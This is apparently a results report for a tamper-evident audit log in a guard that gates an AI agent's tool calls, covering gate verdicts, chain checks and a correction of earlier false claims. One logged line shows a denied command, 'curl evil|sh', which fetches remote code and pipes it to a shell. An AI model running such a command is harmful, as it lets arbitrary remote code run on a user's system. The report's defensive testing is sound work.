# F0 — result

**Run 2026-09-02 against `F0_AUDIT_PERSISTENCE_GATES.md`, registered in
`d047ded` before any code changed.**

## Gates

| gate | verdict |
|---|---|
| P-F0.1 every decision recorded, both modes | **PASS-CLEAN** |
| P-F0.2 the chain survives process boundaries | **PASS-CLEAN** |
| P-F0.3 tampering is detected | **PASS-CLEAN** |
| P-F0.4 truncation detected only up to the last seal | **PASS-CLEAN** (as registered) |
| P-F0.5 the record is sufficient for the read paths | **PARTIAL** |
| P-F0.6 enforcement unaffected | **PASS-CLEAN** |

## P-F0.2 — the one the feature exists for

Six separate subprocesses, one decision each, against a config-loaded `Guard`:

```
audit.jsonl lines        6
entries resumed          6
chain links continuous   True
every digest recomputes  True
seq numbers              [0, 1, 2, 3, 4, 5]
```

Before this phase the same six processes produced no file and six independent
one-entry chains. An in-memory chain is worth nothing to a subprocess adapter,
and the adapter is how every user runs this.

## P-F0.3 / P-F0.4 — what the chain does and does not catch

```
untouched            6 entries, first bad = none
body edited at seq2  6 entries, first bad = ('digest', 2)
entries reordered    6 entries, first bad = ('link', 4)
last 2 removed       4 entries, first bad = none        <- undetectable
```

Truncation of the tail is invisible to a hash chain, which the gate stated in
advance rather than discovering afterwards. Sealing is what covers it, and the
verify report names the unsealed tail length. Recorded here so nobody reads
"tamper-evident" as "tamper-proof".

## P-F0.6 — a full disk must not change a decision

Decisions are byte-identical with the log **off**, **on**, and **unwritable**
(a path whose parent is a regular file, so both `mkdir` and `open` fail):

```
log off == log on        : True
log off == log unwritable: True
write_errors recorded    : 2, surfaced on the log object, never raised
```

The opposite design — refusing when the log is unavailable — would make a full
disk a denial of service against the agent and turn the audit path into an
attack surface.

## P-F0.5 — PARTIAL, and precisely where

The record carries `ts, session, tool, event, tier, allowed, mode, reason,
confirmable, bands, args, ms`, and result events carry `band` and
`strings_remembered`. A session reconstructs from the log alone:

```
result   Read   band=tool      remembered 1 string(s)
decision Bash   DENY  bands={'command': 'tool'}    0.0609ms  arg='curl evil|sh'
decision Bash   ALLOW bands={'command': 'session'} 0.0503ms  arg='pytest -q'
```

**Missing: the deciding rule as an identity.** `reason` is prose — "taint:
command is tool, needs session (grant for session N)" — and the issuer tracks
only `last_reason` with a specificity rank. It iterates grants with an index
and does not surface which one decided.

Not fixed here, deliberately. Exposing a grant identity means changing the
issuer, which is the enforcement core, and the phase whose gate is "enforcement
unaffected" is the wrong place to do it. `trace` can group by prose reason
today; `replay` will want the identity, so it becomes a gate on F4 rather than
a silent assumption inside it.

## Regression

```
conformance 18/18 · policy demo 87/87 · custody 13/13
battery 6/6 attacks refused · sweep 0 suspects · pairs 0 suspects
adapter, MCP, tool-description and extractor tests all pass
```

## What this changes about the claims

`OVERVIEW.md`, the PyPI `README.md` and trust.band's comparison table have all
claimed a hash-chained tamper-evident log since publication. That claim was
false for the installed product — not a regression, never wired; no commit on
any branch ever contained `audit.jsonl`, `audit_path`, or a call to `export()`.

It is true now for any adapter that loads a config, because `from_file` defaults
the path to `audit.jsonl` beside the config. It is **not** yet true for a caller
constructing `Guard` directly without `audit_path`, and the claim should not be
read as covering that case.
